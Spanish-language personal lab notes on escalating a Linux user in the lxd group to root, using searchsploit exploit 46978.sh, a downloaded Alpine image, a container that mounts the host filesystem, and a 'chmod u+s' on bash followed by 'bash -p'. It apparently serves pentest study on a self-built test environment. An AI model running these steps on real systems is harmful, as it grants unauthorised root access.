Para agregar a algun usuario dentro de un grupo se puede hacer de la siguiente manera:
usermod -a -G adm ken
usermod -a -G docker ken

Para eliminar al usuario:
gpasswd -d ken docker

Vamos a instalar un entorno de pruebas con LXD
lxd es similar a docker

ejecutamos: `snap install lxd`

aregamos al grupo user

usermod -a -G lxd ken

buscamos en searchsploit lxd

vemos que no sale un lxd privilege escalation

buscamos mas info:

searchsploit -x linux/local/46978.sh

Esto nos sirve ya que esta automatizada

lo que haces 
te convieertes en ken
pero al hacer id ves que estas dentro del grupo lxd

entonces  nos traemos el exploit al directorio actual
`searchsploit -m linux/local/46978.sh `
y le cambiamo el nombre

Vemos que tenemos que bajarnos una imagen de alpine entonces la bajamos:

wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine

ahora hacemos ``bash build-alpine` (esto nos genra un comprimido)

En caso de que nos de error podemos clonarnos el repositorio de github para bajarnos directamente el comprimido

https://github.com/saghul/lxd-alpine-builder.git

Una vez descargado hacemos lo siguiente:

Este comprimido se comparte a la maquina victima

ahora si nos ejecutamos el ./lxdexploit esta configurado para ejecutarlo de la siguiente manera
[-f] Filename (.tar.gz alpine file)
        [-h] Show this help panel
Entomces:
	ejecutamos el siguiente comando (cargara el comprimido y ejcutara el script)
	./lxdexploit -f alpine-v3.13-x86_64-20210218_0139.tar.gz

Te saldra algo como esto:
![[Pasted image 20250421154834.png]]

hacemos whoami y estamos como root pero dentro del contenedor

nos vamos al directorio nmnt y encontramos otro llamado /root

Nos metemos y hacemos  ``ls`

y ahi ya encontramos los recursos de la maquina
nos metemos al directorio /bin/
dentro del contenedor hacemos 
chmod u+s  bash (le otorga privilegio suid a la bash del usuario )

Nos salimos del contenedor(en automatico se borra el contenedor)

Dentro del usuario noraml en este caso "ken" (que anteriormente no tenia privilegios)
hacemos bash -p y ya elevamos privilegio a root
(Esto se debe que en el contenedor tenia acceso a los recursos del sistema y se podian hacer modificaciones como otorgar privilegios suid, entonces se otorgo privilegio suid a la bash para que al salirnos y acceder de vuelta al usuario normal o estandar pudieramos elevar privilegio de la bash2)



